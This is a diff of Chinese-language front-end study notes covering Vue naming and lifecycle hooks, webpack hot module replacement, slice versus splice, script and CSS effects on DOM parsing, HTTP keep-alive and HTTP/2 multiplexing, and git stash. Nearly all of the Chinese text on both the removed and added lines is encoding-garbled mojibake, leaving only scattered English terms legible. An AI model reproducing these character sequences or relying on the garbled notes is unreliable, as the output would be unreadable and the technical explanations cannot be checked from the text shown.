-PascalCase ÊÇ×îÍ¨ÓÃµÄÉùÃ÷Ô¼¶¨¶ø kebab-case ÊÇ×îÍ¨ÓÃµÄÊ¹ÓÃÔ¼¶¨¡£
+å½“æ³¨å†Œç»„ä»¶ (æˆ–è€… prop) æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ kebab-case (çŸ­æ¨ªçº¿åˆ†éš”å‘½å)ã€camelCase (é©¼å³°å¼å‘½å) æˆ– PascalCase (å•è¯é¦–å­—æ¯å¤§å†™å‘½å)ã€‚
+PascalCase æ˜¯æœ€é€šç”¨çš„å£°æ˜Žçº¦å®šè€Œ kebab-case æ˜¯æœ€é€šç”¨çš„ä½¿ç”¨çº¦å®šã€‚
 
-components: {AppLeaf,MyComponent} Ê¹ÓÃ¾ÍÊÇ<app-leaf></app-leaf>ºÍ<my-component></my-component>
+components: {AppLeaf,MyComponent} ä½¿ç”¨å°±æ˜¯<app-leaf></app-leaf>å’Œ<my-component></my-component>
 
-Ä£¿éÈÈÌæ»»(hot module replacement »ò HMR)ÊÇ webpack Ìá¹©µÄ×îÓÐÓÃµÄ¹¦ÄÜÖ®Ò»¡£Ä£¿éÈÈÌæ»»ÎÞÐèÍêÈ«Ë¢ÐÂÒ³Ãæ£¬¾Ö²¿ÎÞË¢ÐÂµÄÇé¿öÏÂ¾Í¿ÉÒÔ¸üÐÂ¡£ÀýÈçÐÞ¸ÄÄ³¸övue×é¼þ¿ÉÒÔ²»Ë¢ÐÂ½øÐÐ¸üÐÂ,µ«ÊÇ¶Ôjs×ö³ö¸Ä¶¯ÊÇ²»»á×Ô¶¯¸üÐÂµÄ,±ØÐëÖØÐÂ´ò°ü.±ÈÈçÐÞ¸Ämain.js
-
-
-sliceÊÇÇÐµÄÒâË¼,spliceÊÇÕ³½ÓµÄÒâË¼,slice²»»á¸Ä±äÔ­Êý×é,¶øºóÕß»á
-slice(start,end) ·µ»Ø°üº¬startµ«²»°üº¬endµÄÊý×é,²»´«endÔòÖ±½Óµ½Ä©Î²(°üº¬×îºóÒ»¸öÔªËØ)
-splice(start,count,ÔªËØ)·µ»Ø±»É¾µôµÄÔªËØÊý×é,countÊÇÒªÉ¾µôµÄ¸öÊý,È»ºó´ÓstartÄÄÀï¿ªÊ¼²åÈëºóÃæÌí¼ÓµÄÔªËØ.Èç¹ûÔªËØÊÇÒ»¸öÊý×é¿ÉÒÔÓÃÍØÕ¹ÔËËã·ûÕ¹¿ªÌí¼Ó.
+æ¨¡å—çƒ­æ›¿æ¢(hot module replacement æˆ– HMR)æ˜¯ webpack æä¾›çš„æœ€æœ‰ç”¨çš„åŠŸèƒ½ä¹‹ä¸€ã€‚æ¨¡å—çƒ­æ›¿æ¢æ— éœ€å®Œå…¨åˆ·æ–°é¡µé¢ï¼Œå±€éƒ¨æ— åˆ·æ–°çš„æƒ…å†µä¸‹å°±å¯ä»¥æ›´æ–°ã€‚ä¾‹å¦‚ä¿®æ”¹æŸä¸ªvueç»„ä»¶å¯ä»¥ä¸åˆ·æ–°è¿›è¡Œæ›´æ–°,ä½†æ˜¯å¯¹jsåšå‡ºæ”¹åŠ¨æ˜¯ä¸ä¼šè‡ªåŠ¨æ›´æ–°çš„,å¿…é¡»é‡æ–°æ‰“åŒ….æ¯”å¦‚ä¿®æ”¹main.js
 
 
-JavaScriptºÍCSS¶ÔDOM¹¹½¨µÄÓ°Ïì
+sliceæ˜¯åˆ‡çš„æ„æ€,spliceæ˜¯ç²˜æŽ¥çš„æ„æ€,sliceä¸ä¼šæ”¹å˜åŽŸæ•°ç»„,è€ŒåŽè€…ä¼š
+slice(start,end) è¿”å›žåŒ…å«startä½†ä¸åŒ…å«endçš„æ•°ç»„,ä¸ä¼ endåˆ™ç›´æŽ¥åˆ°æœ«å°¾(åŒ…å«æœ€åŽä¸€ä¸ªå…ƒç´ )
+splice(start,count,å…ƒç´ )è¿”å›žè¢«åˆ æŽ‰çš„å…ƒç´ æ•°ç»„,countæ˜¯è¦åˆ æŽ‰çš„ä¸ªæ•°,ç„¶åŽä»Žstartå“ªé‡Œå¼€å§‹æ’å…¥åŽé¢æ·»åŠ çš„å…ƒç´ .å¦‚æžœå…ƒç´ æ˜¯ä¸€ä¸ªæ•°ç»„å¯ä»¥ç”¨æ‹“å±•è¿ç®—ç¬¦å±•å¼€æ·»åŠ .
 
 
-½âÎö¹ý³ÌÖÐÓöµ½ÁËscript±êÇ©Ê±£¬HTML½âÎöÆ÷ÔÝÍ£¹¤×÷£¬JavaScriptÒýÇæ½éÈë£¬Ö´ÐÐ½Å±¾£¬´ËÊ±Ö»ÄÜ·ÃÎÊÎ»ÓÚscriptÖ®ÉÏÒÑ¾­¹¹½¨ÁËµÄDOM¡£·ÃÎÊºóÃæµÄÔªËØ»á·µ»Ønull£¬Ö´ÐÐ²Ù×÷»á±¨´í¡£½Å±¾Ö´ÐÐÍê£¬HTML½âÎöÆ÷»Ö¸´½âÎö¡£
-Èç¹û²»ÊÇÄÚÇ¶½Å±¾£¬¶øÊÇÍ¨¹ýsrc¼ÓÔØµÄ½Å±¾£¨ÓÐsrcÊôÐÔµÄ½Å±¾»áºöÂÔ±êÇ©ÄÚµÄ´úÂë£©£¬»áµÈ´ýÏÂÔØÍê³ÉºóÖ´ÐÐ£¬ÆÚ¼äHTML½âÎöÆ÷Ò»Ö±ÊÇÔÝÍ£µÄ×´Ì¬¡£²»¹ýºÃÔÚChromeä¯ÀÀÆ÷µÄÔ¤½âÎö²Ù×÷»áÔÚäÖÈ¾ÒýÇæÊÕµ½×Ö½ÚÁ÷Ö®ºó¿ªÆôÒ»¸öÔ¤½âÎöÏß³Ì·ÖÎöHTMLÎÄ¼þÖÐ°üº¬µÄJavaScript¡¢CSSµÈÏà¹ØÎÄ¼þÈ»ºóÌáÇ°ÏÂÔØÕâÐ©ÎÄ¼þ¡£
+JavaScriptå’ŒCSSå¯¹DOMæž„å»ºçš„å½±å“
 
 
-ÔÚÓÐsrcÊôÐÔ¼ÓÔØ½Å±¾µÄscript±êÇ©ÖÐÌí¼ÓasyncÊôÐÔ±íÃ÷Õâ¸ö½Å±¾ÊÇÒì²½µÄ£¬ÔÚºóÌ¨¼ÓÔØ£¬HTML½âÎöÆ÷¼ÌÐø¹¤×÷£¬µÈ½Å±¾¼ÓÔØÍê³ÉºóÁ¢¼´´ò¶ÏHTML½âÎöÆ÷£¨Èç¹û»¹Ã»½âÎöÍêµÄ»°£©¿ªÊ¼Ö´ÐÐ½Å±¾¡£
-Ìí¼ÓdeferÊôÐÔÒ²»áÒì²½¼ÓÔØ£¬µ«ÊÇ»áµÈµ½HTML½âÎöÍê±Ï£¬ÔÚDOMContentLoadedÊÂ¼þÖ®Ç°Ö´ÐÐ¡£ÕâÁ½¸öÊôÐÔ¶ÔÎÞsrcÊôÐÔµÄ½Å±¾²»»áÉúÐ§¡£
+è§£æžè¿‡ç¨‹ä¸­é‡åˆ°äº†scriptæ ‡ç­¾æ—¶ï¼ŒHTMLè§£æžå™¨æš‚åœå·¥ä½œï¼ŒJavaScriptå¼•æ“Žä»‹å…¥ï¼Œæ‰§è¡Œè„šæœ¬ï¼Œæ­¤æ—¶åªèƒ½è®¿é—®ä½äºŽscriptä¹‹ä¸Šå·²ç»æž„å»ºäº†çš„DOMã€‚è®¿é—®åŽé¢çš„å…ƒç´ ä¼šè¿”å›žnullï¼Œæ‰§è¡Œæ“ä½œä¼šæŠ¥é”™ã€‚è„šæœ¬æ‰§è¡Œå®Œï¼ŒHTMLè§£æžå™¨æ¢å¤è§£æžã€‚
+å¦‚æžœä¸æ˜¯å†…åµŒè„šæœ¬ï¼Œè€Œæ˜¯é€šè¿‡srcåŠ è½½çš„è„šæœ¬ï¼ˆæœ‰srcå±žæ€§çš„è„šæœ¬ä¼šå¿½ç•¥æ ‡ç­¾å†…çš„ä»£ç ï¼‰ï¼Œä¼šç­‰å¾…ä¸‹è½½å®ŒæˆåŽæ‰§è¡Œï¼ŒæœŸé—´HTMLè§£æžå™¨ä¸€ç›´æ˜¯æš‚åœçš„çŠ¶æ€ã€‚ä¸è¿‡å¥½åœ¨Chromeæµè§ˆå™¨çš„é¢„è§£æžæ“ä½œä¼šåœ¨æ¸²æŸ“å¼•æ“Žæ”¶åˆ°å­—èŠ‚æµä¹‹åŽå¼€å¯ä¸€ä¸ªé¢„è§£æžçº¿ç¨‹åˆ†æžHTMLæ–‡ä»¶ä¸­åŒ…å«çš„JavaScriptã€CSSç­‰ç›¸å…³æ–‡ä»¶ç„¶åŽæå‰ä¸‹è½½è¿™äº›æ–‡ä»¶ã€‚
 
 
-¶ÔÓÚCSS£¬ÓÉÓÚ²»Ö±½Ó²ÎÓëDOM¹¹½¨£¬±¾À´ÊÇ²»»á×èÈûDOMÊ÷µÄ¹¹½¨µÄ¡£µ«ÊÇÈç¹ûÒ³ÃæÓÐÍ¬²½Ö´ÐÐµÄ½Å±¾Ê±£¬ÒòÎªÖ´ÐÐÇ°ÊÇ²»ÖªµÀ½Å±¾ÓÐÃ»ÓÐ²Ù×÷CSSOMµÄ£¬Òò´ËäÖÈ¾ÒýÇæÎªÁË±ÜÃâ½Å±¾Ö´ÐÐ³ö´íµÄ¿ÉÄÜÐÔ£¬Ö±½Ó¼Ù¶¨½Å±¾»áÒÀÀµCSSOM¡£ÓÚÊÇÏÂÔØCSSÎÄ¼þ²¢½âÎö³ÉCSSOM£¬ÔÙÖ´ÐÐ½Å±¾¡£ÆÚ¼äHTML½âÎöÆ÷Ò»Ö±ÊÇÔÝÍ£µÄ×´Ì¬£¬Ö±µ½½Å±¾Ö´ÐÐÍê±Ï²Å¼ÌÐø¹¤×÷¡£
+åœ¨æœ‰srcå±žæ€§åŠ è½½è„šæœ¬çš„scriptæ ‡ç­¾ä¸­æ·»åŠ asyncå±žæ€§è¡¨æ˜Žè¿™ä¸ªè„šæœ¬æ˜¯å¼‚æ­¥çš„ï¼Œåœ¨åŽå°åŠ è½½ï¼ŒHTMLè§£æžå™¨ç»§ç»­å·¥ä½œï¼Œç­‰è„šæœ¬åŠ è½½å®ŒæˆåŽç«‹å³æ‰“æ–­HTMLè§£æžå™¨ï¼ˆå¦‚æžœè¿˜æ²¡è§£æžå®Œçš„è¯ï¼‰å¼€å§‹æ‰§è¡Œè„šæœ¬ã€‚
+æ·»åŠ deferå±žæ€§ä¹Ÿä¼šå¼‚æ­¥åŠ è½½ï¼Œä½†æ˜¯ä¼šç­‰åˆ°HTMLè§£æžå®Œæ¯•ï¼Œåœ¨DOMContentLoadedäº‹ä»¶ä¹‹å‰æ‰§è¡Œã€‚è¿™ä¸¤ä¸ªå±žæ€§å¯¹æ— srcå±žæ€§çš„è„šæœ¬ä¸ä¼šç”Ÿæ•ˆã€‚
+
+
+å¯¹äºŽCSSï¼Œç”±äºŽä¸ç›´æŽ¥å‚ä¸ŽDOMæž„å»ºï¼Œæœ¬æ¥æ˜¯ä¸ä¼šé˜»å¡žDOMæ ‘çš„æž„å»ºçš„ã€‚ä½†æ˜¯å¦‚æžœé¡µé¢æœ‰åŒæ­¥æ‰§è¡Œçš„è„šæœ¬æ—¶ï¼Œå› ä¸ºæ‰§è¡Œå‰æ˜¯ä¸çŸ¥é“è„šæœ¬æœ‰æ²¡æœ‰æ“ä½œCSSOMçš„ï¼Œå› æ­¤æ¸²æŸ“å¼•æ“Žä¸ºäº†é¿å…è„šæœ¬æ‰§è¡Œå‡ºé”™çš„å¯èƒ½æ€§ï¼Œç›´æŽ¥å‡å®šè„šæœ¬ä¼šä¾èµ–CSSOMã€‚äºŽæ˜¯ä¸‹è½½CSSæ–‡ä»¶å¹¶è§£æžæˆCSSOMï¼Œå†æ‰§è¡Œè„šæœ¬ã€‚æœŸé—´HTMLè§£æžå™¨ä¸€ç›´æ˜¯æš‚åœçš„çŠ¶æ€ï¼Œç›´åˆ°è„šæœ¬æ‰§è¡Œå®Œæ¯•æ‰ç»§ç»­å·¥ä½œã€‚
 
 
 
-Ò³ÃæÓÐÒì²½½Å±¾Ê±£¬»á¼ÌÐø¹¹½¨DOMÊ÷£¬½Å±¾Ö´ÐÐÇ°ÐèÒªµÈ´ýCSS¡£ÊÇ·ñ¼ÌÐøäÖÈ¾ÔòÐèÒª¿´CSSÊÇ·ñ¾ÍÐ÷£¬Èç¹ûCSS»¹ÔÚ¼ÓÔØÖÐÔòÐèÒªµÈ´ý¡£
+é¡µé¢æœ‰å¼‚æ­¥è„šæœ¬æ—¶ï¼Œä¼šç»§ç»­æž„å»ºDOMæ ‘ï¼Œè„šæœ¬æ‰§è¡Œå‰éœ€è¦ç­‰å¾…CSSã€‚æ˜¯å¦ç»§ç»­æ¸²æŸ“åˆ™éœ€è¦çœ‹CSSæ˜¯å¦å°±ç»ªï¼Œå¦‚æžœCSSè¿˜åœ¨åŠ è½½ä¸­åˆ™éœ€è¦ç­‰å¾…ã€‚
 
-Èç¹ûÊÇdefer½Å±¾£¬CSS¼ÓÔØÍê¾Í¿ªÊ¼äÖÈ¾£¬Ö»ÊÇDOMContentLoadedºÍloadÊÂ¼þ»áÑÓ³Ù´¥·¢£»
-Èç¹ûÊÇasync½Å±¾£¬DOMContentLoadedÕý³£´¥·¢£¬CSS¼ÓÔØÍê¾Í¿ªÊ¼äÖÈ¾£¬loadÊÂ¼þ»áµÈ´ý½Å±¾Ö´ÐÐÍêÔÙ´¥·¢
-×ÜÖ®CSS×èÈûDOMÊ÷µÄ¹¹½¨Óë·ñÈ¡¾öÓÚ½Å±¾Ö´ÐÐµÄÊ±»ú¡£
+å¦‚æžœæ˜¯deferè„šæœ¬ï¼ŒCSSåŠ è½½å®Œå°±å¼€å§‹æ¸²æŸ“ï¼Œåªæ˜¯DOMContentLoadedå’Œloadäº‹ä»¶ä¼šå»¶è¿Ÿè§¦å‘ï¼›
+å¦‚æžœæ˜¯asyncè„šæœ¬ï¼ŒDOMContentLoadedæ­£å¸¸è§¦å‘ï¼ŒCSSåŠ è½½å®Œå°±å¼€å§‹æ¸²æŸ“ï¼Œloadäº‹ä»¶ä¼šç­‰å¾…è„šæœ¬æ‰§è¡Œå®Œå†è§¦å‘
+æ€»ä¹‹CSSé˜»å¡žDOMæ ‘çš„æž„å»ºä¸Žå¦å–å†³äºŽè„šæœ¬æ‰§è¡Œçš„æ—¶æœºã€‚
 
-¼ÓÔØäÖÈ¾¹ý³Ì
-¸¸beforeCreate->¸¸created->¸¸beforeMount->×ÓbeforeCreate->×Ócreated->×ÓbeforeMount->×Ómounted->¸¸mounted
-×Ó×é¼þ¸üÐÂ¹ý³Ì
-¸¸beforeUpdate->×ÓbeforeUpdate->×Óupdated->¸¸updated
-¸¸×é¼þ¸üÐÂ¹ý³Ì
-¸¸beforeUpdate->¸¸updated
-Ïú»Ù¹ý³Ì
-¸¸beforeDestroy->×ÓbeforeDestroy->×Ódestroyed->¸¸destroyed
+åŠ è½½æ¸²æŸ“è¿‡ç¨‹
+çˆ¶beforeCreate->çˆ¶created->çˆ¶beforeMount->å­beforeCreate->å­created->å­beforeMount->å­mounted->çˆ¶mounted
+å­ç»„ä»¶æ›´æ–°è¿‡ç¨‹
+çˆ¶beforeUpdate->å­beforeUpdate->å­updated->çˆ¶updated
+çˆ¶ç»„ä»¶æ›´æ–°è¿‡ç¨‹
+çˆ¶beforeUpdate->çˆ¶updated
+é”€æ¯è¿‡ç¨‹
+çˆ¶beforeDestroy->å­beforeDestroy->å­destroyed->çˆ¶destroyed
 
-rotateXÏòÉÏ×ªÊÇÕý rotateYÏòÓÒ×ªÊÇÕý
+rotateXå‘ä¸Šè½¬æ˜¯æ­£ rotateYå‘å³è½¬æ˜¯æ­£
 
-HTTP1.1 Èç¹ûÒªÍ¬Ê±·¢Æð¶à¸öÇëÇó£¬¾ÍµÃ½¨Á¢¶à¸ö TCP Á¬½Ó£¬ÒòÎªÒ»¸ö TCP Á¬½ÓÍ¬Ê±Ö»ÄÜ´¦ÀíÒ»¸ö HTTP1.1 µÄÇëÇó¡£
-(×¢Òâ: ÔÚ1.1ÀïÃæ¿ÉÒÔ¶à¸öÇëÇó¹²ÓÃÒ»¸ötcpÁ¬½Ó,µ«ÊÇÊÇÓÐÇëÇóË³ÐòµÄ,Èç¹ûÄ³¸öÇëÇó»¨·ÑÊ±¼ä½Ï³¤»áÔì³É¶ÔÍ·×èÈû.Èç¹ûÏëÍ¬Ê±·¢Æð¶à¸öÇëÇó,¾ÍÐèÒª½¨Á¢¶à¸öTCPÁ¬½Ó,¿ÉÊÇ¿Í»§¶ËÓÐÍ¬Ò»ÓòÃûÏÂµÄÇëÇóÓÐ×î´ó²¢·¢Á¬½ÓÏÞÖÆ,ÀýÈç¹È¸è¾Í´óÔ¼ÊÇ6¸ö,¿ÉÒÔ½«×ÊÔ´·ÖÅä²»Í¬ÓòÃû,ÕâÑù¾Í¿ÉÒÔÍ»ÆÆä¯ÀÀÆ÷ÏÞÖÆ,½¨Á¢¸ü¶àtcpÁ¬½Ó)¶øÐ­ÒéÒé¹æ¶¨HTTP/1.0Èç¹ûÏëÒª±£³Ö³¤Á¬½Ó£¬ÐèÒªÔÚÇëÇóÍ·ÖÐ¼ÓÉÏConnection: keep-alive£¬¶øHTTP/1.1Ä¬ÈÏÊÇÖ§³Ö³¤Á¬½ÓµÄ£¬ÓÐÃ»ÓÐÕâ¸öÇëÇóÍ·¶¼ÐÐ¡£
+HTTP1.1 å¦‚æžœè¦åŒæ—¶å‘èµ·å¤šä¸ªè¯·æ±‚ï¼Œå°±å¾—å»ºç«‹å¤šä¸ª TCP è¿žæŽ¥ï¼Œå› ä¸ºä¸€ä¸ª TCP è¿žæŽ¥åŒæ—¶åªèƒ½å¤„ç†ä¸€ä¸ª HTTP1.1 çš„è¯·æ±‚ã€‚
+(æ³¨æ„: åœ¨1.1é‡Œé¢å¯ä»¥å¤šä¸ªè¯·æ±‚å…±ç”¨ä¸€ä¸ªtcpè¿žæŽ¥,ä½†æ˜¯æ˜¯æœ‰è¯·æ±‚é¡ºåºçš„,å¦‚æžœæŸä¸ªè¯·æ±‚èŠ±è´¹æ—¶é—´è¾ƒé•¿ä¼šé€ æˆå¯¹å¤´é˜»å¡ž.å¦‚æžœæƒ³åŒæ—¶å‘èµ·å¤šä¸ªè¯·æ±‚,å°±éœ€è¦å»ºç«‹å¤šä¸ªTCPè¿žæŽ¥,å¯æ˜¯å®¢æˆ·ç«¯æœ‰åŒä¸€åŸŸåä¸‹çš„è¯·æ±‚æœ‰æœ€å¤§å¹¶å‘è¿žæŽ¥é™åˆ¶,ä¾‹å¦‚è°·æ­Œå°±å¤§çº¦æ˜¯6ä¸ª,å¯ä»¥å°†èµ„æºåˆ†é…ä¸åŒåŸŸå,è¿™æ ·å°±å¯ä»¥çªç ´æµè§ˆå™¨é™åˆ¶,å»ºç«‹æ›´å¤štcpè¿žæŽ¥)è€Œåè®®è®®è§„å®šHTTP/1.0å¦‚æžœæƒ³è¦ä¿æŒé•¿è¿žæŽ¥ï¼Œéœ€è¦åœ¨è¯·æ±‚å¤´ä¸­åŠ ä¸ŠConnection: keep-aliveï¼Œè€ŒHTTP/1.1é»˜è®¤æ˜¯æ”¯æŒé•¿è¿žæŽ¥çš„ï¼Œæœ‰æ²¡æœ‰è¿™ä¸ªè¯·æ±‚å¤´éƒ½è¡Œã€‚
 
-µ«ÊÇhttp³¤Á¬½Ó»áÒ»Ö±±£³ÖÂð£¿¿Ï¶¨ÊÇ²»»áµÄ¡£Ò»°ã·þÎñ¶Ë¶¼»áÉèÖÃkeep-alive³¬Ê±Ê±¼ä¡£³¬¹ýÖ¸¶¨µÄÊ±¼ä¼ä¸ô£¬·þÎñ¶Ë¾Í»áÖ÷¶¯¹Ø±ÕÁ¬½Ó¡£Í¬Ê±·þÎñ¶Ë»¹»áÉèÖÃÒ»¸ö²ÎÊý½Ð×î´óÇëÇóÊý£¬±ÈÈçµ±×î´óÇëÇóÊýÊÇ300Ê±£¬Ö»ÒªÇëÇó´ÎÊý³¬¹ý300´Î£¬¼´Ê¹»¹Ã»µ½³¬Ê±Ê±¼ä£¬·þÎñ¶ËÒ²»áÖ÷¶¯¹Ø±ÕÁ¬½Ó¡£
+ä½†æ˜¯httpé•¿è¿žæŽ¥ä¼šä¸€ç›´ä¿æŒå—ï¼Ÿè‚¯å®šæ˜¯ä¸ä¼šçš„ã€‚ä¸€èˆ¬æœåŠ¡ç«¯éƒ½ä¼šè®¾ç½®keep-aliveè¶…æ—¶æ—¶é—´ã€‚è¶…è¿‡æŒ‡å®šçš„æ—¶é—´é—´éš”ï¼ŒæœåŠ¡ç«¯å°±ä¼šä¸»åŠ¨å…³é—­è¿žæŽ¥ã€‚åŒæ—¶æœåŠ¡ç«¯è¿˜ä¼šè®¾ç½®ä¸€ä¸ªå‚æ•°å«æœ€å¤§è¯·æ±‚æ•°ï¼Œæ¯”å¦‚å½“æœ€å¤§è¯·æ±‚æ•°æ˜¯300æ—¶ï¼Œåªè¦è¯·æ±‚æ¬¡æ•°è¶…è¿‡300æ¬¡ï¼Œå³ä½¿è¿˜æ²¡åˆ°è¶…æ—¶æ—¶é—´ï¼ŒæœåŠ¡ç«¯ä¹Ÿä¼šä¸»åŠ¨å…³é—­è¿žæŽ¥ã€‚
 
-Ã¿·¢ÆðÒ»¸ö HTTP ÇëÇó£¬¶¼µÃ¾­ÀúÈý´ÎÎÕÊÖ½¨Á¢ TCP Á¬½Ó£¬Èç¹ûÁ¬½ÓÖ»ÓÃÀ´½»»»ÉÙÁ¿Êý¾Ý£¬Õâ¸ö¹ý³Ì¾Í»áÑÏÖØ½µµÍ HTTP ÐÔÄÜ¡£ËùÒÔÎÒÃÇ¿ÉÒÔ½«¶à¸öÐ¡ÎÄ¼þºÏ³ÉÒ»¸ö´óÎÄ¼þ£¬´Ó¶ø¼õÉÙ HTTP ÇëÇó´ÎÊý¡£
+æ¯å‘èµ·ä¸€ä¸ª HTTP è¯·æ±‚ï¼Œéƒ½å¾—ç»åŽ†ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹ TCP è¿žæŽ¥ï¼Œå¦‚æžœè¿žæŽ¥åªç”¨æ¥äº¤æ¢å°‘é‡æ•°æ®ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±ä¼šä¸¥é‡é™ä½Ž HTTP æ€§èƒ½ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†å¤šä¸ªå°æ–‡ä»¶åˆæˆä¸€ä¸ªå¤§æ–‡ä»¶ï¼Œä»Žè€Œå‡å°‘ HTTP è¯·æ±‚æ¬¡æ•°ã€‚
 
-ÆäÊµÓÉÓÚ³Ö¾ÃÁ¬½Ó£¨ÖØÓÃ TCP Á¬½Ó£¬ÒÔÏû³ýÁ¬½Ó¼°¹Ø±ÕÊ±ÑÓ£»HTTP/1.1 Ä¬ÈÏ¿ªÆô³Ö¾ÃÁ¬½Ó£©µÄ´æÔÚ£¬Ã¿¸öÐÂÇëÇó²»Ò»¶¨¶¼ÐèÒª½¨Á¢Ò»¸öÐÂµÄ TCP Á¬½Ó¡£µ«ÊÇ£¬ä¯ÀÀÆ÷´¦ÀíÍêÒ»¸ö HTTP ÇëÇó²ÅÄÜ·¢ÆðÏÂÒ»¸ö£¬ËùÒÔÔÚ TCP Á¬½ÓÊýÃ»´ïµ½ä¯ÀÀÆ÷¹æ¶¨µÄÉÏÏÞÊ±£¬»¹ÊÇ»á½¨Á¢ÐÂµÄ TCP Á¬½Ó¡£´ÓÕâµãÀ´¿´£¬¼õÉÙ HTTP ÇëÇóÈÔÈ»ÊÇÓÐ±ØÒªµÄ¡£(¼ÙÈçÎÒÏÖÔÚÓÐÆß¸öÁ¬½ÓÇëÇó,Ç°ÃæÁù¸öÍ¬Ê±·¢ËÍ,ÄÇÃ´¾Í»á´´½¨Áù¸ötcpÁ¬½Ó,µÚÆß¸ö¾Í»áÖØÓÃÆäÖÐÒ»¸öTCP½øÐÐµÈ´ý)
+å…¶å®žç”±äºŽæŒä¹…è¿žæŽ¥ï¼ˆé‡ç”¨ TCP è¿žæŽ¥ï¼Œä»¥æ¶ˆé™¤è¿žæŽ¥åŠå…³é—­æ—¶å»¶ï¼›HTTP/1.1 é»˜è®¤å¼€å¯æŒä¹…è¿žæŽ¥ï¼‰çš„å­˜åœ¨ï¼Œæ¯ä¸ªæ–°è¯·æ±‚ä¸ä¸€å®šéƒ½éœ€è¦å»ºç«‹ä¸€ä¸ªæ–°çš„ TCP è¿žæŽ¥ã€‚ä½†æ˜¯ï¼Œæµè§ˆå™¨å¤„ç†å®Œä¸€ä¸ª HTTP è¯·æ±‚æ‰èƒ½å‘èµ·ä¸‹ä¸€ä¸ªï¼Œæ‰€ä»¥åœ¨ TCP è¿žæŽ¥æ•°æ²¡è¾¾åˆ°æµè§ˆå™¨è§„å®šçš„ä¸Šé™æ—¶ï¼Œè¿˜æ˜¯ä¼šå»ºç«‹æ–°çš„ TCP è¿žæŽ¥ã€‚ä»Žè¿™ç‚¹æ¥çœ‹ï¼Œå‡å°‘ HTTP è¯·æ±‚ä»ç„¶æ˜¯æœ‰å¿…è¦çš„ã€‚(å‡å¦‚æˆ‘çŽ°åœ¨æœ‰ä¸ƒä¸ªè¿žæŽ¥è¯·æ±‚,å‰é¢å…­ä¸ªåŒæ—¶å‘é€,é‚£ä¹ˆå°±ä¼šåˆ›å»ºå…­ä¸ªtcpè¿žæŽ¥,ç¬¬ä¸ƒä¸ªå°±ä¼šé‡ç”¨å…¶ä¸­ä¸€ä¸ªTCPè¿›è¡Œç­‰å¾…)
 
-ÔÚ HTTP2 ÉÏ£¬¶à¸öÇëÇó¿ÉÒÔ¹²ÓÃÒ»¸ö TCP Á¬½Ó£¬Õâ³ÆÎª¶àÂ·¸´ÓÃ¡£Í¬Ò»¸öÇëÇóºÍÏìÓ¦ÓÃÒ»¸öÁ÷À´±íÊ¾£¬²¢ÓÐÎ¨Ò»µÄÁ÷ ID À´±êÊ¶¡£
-¶à¸öÇëÇóºÍÏìÓ¦ÔÚ TCP Á¬½ÓÖÐ¿ÉÒÔÂÒÐò·¢ËÍ£¬µ½´ïÄ¿µÄµØºóÔÙÍ¨¹ýÁ÷ ID ÖØÐÂ×é½¨¡£
+åœ¨ HTTP2 ä¸Šï¼Œå¤šä¸ªè¯·æ±‚å¯ä»¥å…±ç”¨ä¸€ä¸ª TCP è¿žæŽ¥ï¼Œè¿™ç§°ä¸ºå¤šè·¯å¤ç”¨ã€‚åŒä¸€ä¸ªè¯·æ±‚å’Œå“åº”ç”¨ä¸€ä¸ªæµæ¥è¡¨ç¤ºï¼Œå¹¶æœ‰å”¯ä¸€çš„æµ ID æ¥æ ‡è¯†ã€‚
+å¤šä¸ªè¯·æ±‚å’Œå“åº”åœ¨ TCP è¿žæŽ¥ä¸­å¯ä»¥ä¹±åºå‘é€ï¼Œåˆ°è¾¾ç›®çš„åœ°åŽå†é€šè¿‡æµ ID é‡æ–°ç»„å»ºã€‚
 
 
 
 
 TersePlugin,BundleAnalyZerPlugin
 
-µ±Äãµ±Ç°·ÖÖ§ÓÐÐÞ¸ÄµÄÎÄ¼þmodified»¹Ã»ÓÐadd»òÕßÄãaddÁË»¹ÓÐcommitÄÇÃ´ÄãÊÇÎÞ·¨×öµ½ÇÐ»»·ÖÖ§µÄ,¶øÈç¹ûÄãÖ»ÊÇÐÂ½¨ÁËÒ»¸öÎÄ¼þ(²¢ÇÒÃ»ÓÐÆäËûµÄÐÞ¸Ã¹ýµÄÎÄ¼þ),ÄÇÃ´²»»áÓ°ÏìÄãÈ´ÇÐ»»·ÖÖ§!
+å½“ä½ å½“å‰åˆ†æ”¯æœ‰ä¿®æ”¹çš„æ–‡ä»¶modifiedè¿˜æ²¡æœ‰addæˆ–è€…ä½ addäº†è¿˜æœ‰commité‚£ä¹ˆä½ æ˜¯æ— æ³•åšåˆ°åˆ‡æ¢åˆ†æ”¯çš„,è€Œå¦‚æžœä½ åªæ˜¯æ–°å»ºäº†ä¸€ä¸ªæ–‡ä»¶(å¹¶ä¸”æ²¡æœ‰å…¶ä»–çš„ä¿®è¯¥è¿‡çš„æ–‡ä»¶),é‚£ä¹ˆä¸ä¼šå½±å“ä½ å´åˆ‡æ¢åˆ†æ”¯!
 
-µ±Äãgit stash²Ù×÷µÄÊ±ºò,ÎÞÂÛÄãµ±Ç°·ÖÖ§ÏÂµÄÎÄ¼þ´ËÊ±ÓÐÃ»ÓÐ½øÐÐadd²Ù×÷,ÔÚÄãÐÞ¸´bugºóÇÐ»Øµ±Ç°·ÖÖ§µÄÊ±ºò¶¼»áÊÇÔÚÔÝ´æÇø»¹Ã»ÓÐaddµÄ×´Ì¬,ÄãÐèÒªÔÙ´Î½øÐÐaddÔÙcommit,²¢ÇÒÔÚÄãstashÖ®ºó²é¿´ÄÚÈÝÊÇÄãÃ»ÐÞ¸ÄÖ®Ç°µÄÄÚÈÝ,Ö»ÓÐµ±Äãgit stash pop(apply)²Å»áÏÔÊ¾ÄãÐÞ¸ÄÖ®ºóµÄÄÚÈÝ!
